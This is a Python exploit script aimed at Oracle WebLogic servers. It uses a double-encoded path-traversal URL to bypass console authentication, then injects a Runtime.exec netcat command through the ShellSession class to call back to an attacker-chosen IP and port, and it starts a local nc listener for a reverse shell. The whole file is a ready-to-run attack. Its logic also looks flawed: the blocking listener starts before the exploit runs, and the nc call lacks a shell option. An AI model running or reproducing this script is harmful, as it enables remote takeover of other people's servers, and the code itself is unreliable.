import sys
import requests
import subprocess

class WebLogic:
    def __init__(self):
        self.target = sys.argv[1]
        self.target_port = 7001
        self.home_ip = sys.argv[2]
        self.home_port = sys.argv[3]
        self.url = f"http://{self.target}:{self.target_port}/console/css/%252e%252e%252fconsole.portal"

    def check_auth(self):
        response = requests.get(self.url)
        if response.status_code == 200:
            print("[+] Target is vulnerable")
        else:
            print("[-] Target is not vulnerable")

    def exploit(self):
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        cmd = f"java.lang.Runtime.getRuntime().exec('nc%20{self.home_ip}%20{self.home_port}');"
        url = f"{self.url}?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession({cmd})"
        response = requests.post(url, headers=headers)
        if response.status_code == 200:
            print("[+] Exploit successful")
        else:
            print("[-] Exploit failed")

    def reverse_shell(self):
        print("[*] Starting reverse shell listener...")
        subprocess.run(["nc", "-lvnp", self.home_port])

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 main.py <target> <home_ip> <home_port>")
        sys.exit()
    web_logic = WebLogic()
    web_logic.check_auth()
    web_logic.reverse_shell()
    web_logic.exploit()